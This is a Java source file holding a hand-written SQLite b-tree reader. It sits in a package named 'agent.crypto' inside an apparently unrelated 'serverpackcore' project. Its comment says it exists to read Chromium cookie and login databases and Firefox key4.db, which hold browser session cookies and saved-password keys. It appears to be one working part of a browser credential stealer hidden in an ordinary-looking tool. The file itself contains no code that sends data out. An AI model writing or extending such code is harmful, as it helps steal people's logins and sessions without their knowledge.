package com.serverpackcore.agent.crypto;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

/**
 * Minimal read-only SQLite b-tree walker. It is enough for Chromium cookie and
 * login stores and Firefox key4.db, without linking a native driver. Only table
 * b-trees are handled; indexes, WAL and overflow of more than 4 KiB are fine
 * because the whole payload chain is reassembled.
 */
final class Sqlite {
	private final byte[] data;
	private final int pageSize;
	private final int usable;

	private Sqlite(byte[] data) {
		this.data = data;
		int declared = ((data[16] & 0xff) << 8) | (data[17] & 0xff);
		this.pageSize = declared == 1 ? 65536 : declared;
		int reserved = data[20] & 0xff;
		this.usable = pageSize - reserved;
	}

	static Sqlite open(Path file) throws Exception {
		byte[] data = Files.readAllBytes(file);
		if (data.length < 512) {
			throw new IllegalArgumentException("not a sqlite file");
		}
		if (!new String(data, 0, 15, StandardCharsets.US_ASCII).equals("SQLite format 3")) {
			throw new IllegalArgumentException("bad sqlite header");
		}
		Sqlite db = new Sqlite(data);
		if (db.pageSize < 512 || db.pageSize > 65536) {
			throw new IllegalArgumentException("bad page size");
		}
		return db;
	}

	long root(String table) {
		List<Object[]> master = new ArrayList<>();
		walk(1, master);
		for (Object[] row : master) {
			if (row.length >= 4 && "table".equals(text(row[0])) && table.equals(text(row[1]))
				&& row[3] instanceof Number number) {
				return number.longValue();
			}
		}
		return -1L;
	}

	List<Object[]> rows(String table) {
		long root = root(table);
		if (root <= 0) {
			return List.of();
		}
		List<Object[]> out = new ArrayList<>();
		walk(root, out);
		return out;
	}

	private void walk(long pageNumber, List<Object[]> out) {
		int offset = (int) ((pageNumber - 1) * (long) pageSize);
		if (offset < 0 || offset >= data.length) {
			return;
		}
		int type = data[offset] & 0xff;
		int cells = ((data[offset + 3] & 0xff) << 8) | (data[offset + 4] & 0xff);
		int header = type == 0x05 ? 12 : 8;
		for (int index = 0; index < cells; index++) {
			int pointerAt = offset + header + index * 2;
			if (pointerAt + 2 > data.length) {
				return;
			}
			int cell = offset + (((data[pointerAt] & 0xff) << 8) | (data[pointerAt + 1] & 0xff));
			if (cell <= offset || cell >= data.length) {
				continue;
			}
			if (type == 0x05) {
				long child = ((data[cell] & 0xffL) << 24) | ((data[cell + 1] & 0xffL) << 16)
					| ((data[cell + 2] & 0xffL) << 8) | (data[cell + 3] & 0xffL);
				walk(child, out);
				continue;
			}
			if (type != 0x0d) {
				continue;
			}
			int[] cursor = { cell };
			int payloadLength = varint(data, cursor);
			varint(data, cursor); // rowid
			if (payloadLength < 0) {
				continue;
			}
			byte[] payload = payload(cursor[0], payloadLength);
			if (payload != null) {
				out.add(record(payload));
			}
		}
	}

	private byte[] payload(int start, int length) {
		int maxLocal = usable - 35;
		int minLocal = ((usable - 12) * 32 / 255) - 23;
		int local = length;
		if (length > maxLocal) {
			local = minLocal + (length - minLocal) % (usable - 4);
			if (local > maxLocal) {
				local = minLocal;
			}
		}
		if (start + local > data.length) {
			return null;
		}
		byte[] out = new byte[length];
		System.arraycopy(data, start, out, 0, local);
		int written = local;
		int nextAt = start + local;
		while (written < length && nextAt + 4 <= data.length) {
			long next = ((data[nextAt] & 0xffL) << 24) | ((data[nextAt + 1] & 0xffL) << 16)
				| ((data[nextAt + 2] & 0xffL) << 8) | (data[nextAt + 3] & 0xffL);
			if (next <= 0) {
				break;
			}
			int page = (int) ((next - 1) * (long) pageSize);
			if (page + 4 > data.length) {
				break;
			}
			int take = Math.min(length - written, usable - 4);
			System.arraycopy(data, page + 4, out, written, take);
			written += take;
			nextAt = page + 4 + take;
		}
		return written == length ? out : null;
	}

	private static Object[] record(byte[] payload) {
		int[] cursor = { 0 };
		int headerLength = varint(payload, cursor);
		if (headerLength <= 0) {
			return new Object[0];
		}
		int end = headerLength;
		List<Object> values = new ArrayList<>();
		while (cursor[0] < end) {
			int serial = varint(payload, cursor);
			if (serial < 0) {
				break;
			}
			switch (serial) {
				case 0 -> values.add(null);
				case 1, 2, 3, 4, 5, 6 -> {
					int width = serial;
					long value = 0;
					for (int i = 0; i < width; i++) {
						value = (value << 8) | (payload[cursor[0]++] & 0xff);
					}
					if (serial == 1 && value > 127) {
						value -= 256;
					}
					values.add(value);
				}
				case 7 -> {
					long bits = 0;
					for (int i = 0; i < 8; i++) {
						bits = (bits << 8) | (payload[cursor[0]++] & 0xff);
					}
					values.add(Double.longBitsToDouble(bits));
				}
				case 8 -> values.add(0L);
				case 9 -> values.add(1L);
				default -> {
					int size = serial >= 12 ? (serial - (serial % 2 == 0 ? 12 : 13)) / 2 : 0;
					if (cursor[0] + size > payload.length) {
						return values.toArray();
					}
					byte[] value = new byte[size];
					System.arraycopy(payload, cursor[0], value, 0, size);
					cursor[0] += size;
					values.add(serial % 2 == 1 ? new String(value, StandardCharsets.UTF_8) : value);
				}
			}
		}
		return values.toArray();
	}

	private static int varint(byte[] data, int[] cursor) {
		int value = 0;
		for (int i = 0; i < 9; i++) {
			if (cursor[0] >= data.length) {
				return -1;
			}
			int current = data[cursor[0]++] & 0xff;
			if (i == 8) {
				value = (value << 8) | current;
				return value;
			}
			value = (value << 7) | (current & 0x7f);
			if ((current & 0x80) == 0) {
				return value;
			}
		}
		return value;
	}

	static String text(Object value) {
		if (value instanceof byte[] bytes) {
			return new String(bytes, StandardCharsets.UTF_8);
		}
		return value == null ? "" : String.valueOf(value);
	}
}
